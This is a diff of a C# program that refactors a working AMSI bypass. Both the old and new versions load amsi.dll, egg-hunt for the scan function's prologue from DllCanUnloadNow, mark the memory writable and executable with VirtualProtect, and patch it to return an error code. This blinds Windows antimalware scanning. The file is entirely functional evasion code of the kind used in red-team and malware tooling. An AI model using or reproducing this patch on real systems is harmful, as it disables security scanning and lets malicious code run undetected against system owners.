@@ -1,34 +1,27 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace AMSIBypass {
-    public class Program {
-
-        [DllImport("kernel32")]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        private static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        static void Main(string[] args) { }
-
-        public static void Patch() {
-            Console.WriteLine("-- AMSI Patching");
-            Console.WriteLine("-- Paul Laîné (@am0nsec)\n");
-
-            // Get the DllCanUnload function address
-            IntPtr hModule = LoadLibrary("amsi.dll");
-            Console.WriteLine("[+] AMSI DLL handle: " + hModule);
-
-            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");
-            Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);
-
-            // Dynamically get the address of the function to patch
+namespace AMSI
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
             byte[] egg = { };
             byte[] patch = { };
-            if (IntPtr.Size == 8) {
-                egg = new byte[] {
+            Data.PatchData(ref egg, ref patch);
+
+            AMSIPatch.Patch(egg, patch);
+        }
+    }
+    class Data
+    {
+        public static void PatchData(ref byte[]egg, ref byte[] patch)
+        {
+            if (IntPtr.Size == 8)
+            {
+                egg = new byte[]
+                {
                     0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                     0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                     0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
@@ -38,10 +31,16 @@ namespace AMSIBypass {
                     0x41, 0x57,             // push    r15
                     0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                 };
-
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            } else {
-                egg = new byte[] {
+                patch = new byte[]
+                {
+                    0xB8, 0x57, 0x00, 0x07, 0x80, //mov     eax,80070057h
+                    0xC3                          //ret
+                };
+            }
+            else
+            {
+                egg = new byte[] 
+                {
                     0x8B, 0xFF,             // mov     edi,edi
                     0x55,                   // push    ebp
                     0x8B, 0xEC,             // mov     ebp,esp
@@ -49,41 +48,66 @@ namespace AMSIBypass {
                     0x53,                   // push    ebx
                     0x56                    // push    esi
                 };
-
-                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+                patch = new byte[]
+                {
+                    0xB8, 0x57, 0x00, 0x07, 0x80, //mov     eax,80070057h
+                    0xC2, 0x18, 0x00              //ret     18h
+                };
             }
-            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
-            Console.WriteLine("[+] Targeted address: " + address);
-
-            // Change the memory protection of the memory region 
-            // PAGE_READWRITE = 0x04
-            uint oldProtectionBuffer = 0;
-            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);
-
-            // Patch the function
-            //byte[] patch = { 0x31, 0xC0, 0xC3 };
-            Marshal.Copy(patch, 0, address, 3);
-
-            // Reinitialise the memory protection of the memory region
-            uint a = 0;
-            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);
         }
-
-        private static IntPtr FindAddress(IntPtr address, byte[] egg) {
-            while (true) {
+    }
+    class AMSIPatch
+    {
+        private static IntPtr EggHunter(IntPtr address, byte[] egg)
+        {
+            while (true)
+            {
                 int count = 0;
 
-                while (true) {
+                while (true)
+                {
                     address = IntPtr.Add(address, 1);
-                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count)) {
+                    if (Marshal.ReadByte(address) == egg[count])   //(byte)egg.GetValue(count)
+                    {
                         count++;
                         if (count == egg.Length)
                             return IntPtr.Subtract(address, egg.Length - 1);
-                    } else {
+                    }
+                    else
+                    {
                         break;
                     }
                 }
             }
         }
+        public static void Patch(byte[] egg, byte[] patch)
+        {
+            try
+            {
+                IntPtr hModule = Win32.LoadLibrary("amsi.dll");
+                IntPtr FuncAddr = Win32.GetProcAddress(hModule, "DllCanUnloadNow");
+
+                IntPtr TargetAddress = EggHunter(FuncAddr, egg);
+                uint oldProtect;
+                Win32.VirtualProtect(TargetAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+                Marshal.Copy(patch, 0, TargetAddress, patch.Length);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+            }
+        }
+    }
+    class Win32
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     }
 }
